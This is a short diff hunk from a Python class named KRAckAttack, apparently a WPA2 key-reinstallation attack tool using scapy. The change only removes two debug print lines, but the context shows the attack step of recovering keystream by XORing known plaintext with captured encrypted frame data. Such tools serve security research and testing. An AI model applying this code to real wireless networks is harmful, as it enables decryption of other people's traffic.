@@ -323,8 +323,6 @@ class KRAckAttack():
 
 		# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
 		plaintext = "\xaa\xaa\x03\x00\x00\x00"
-		print('Debug: ', end='') # !--
-		print(p[Dot11WEP].wepdata)
 		encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
 		keystream = xorstr(plaintext, encrypted)
 
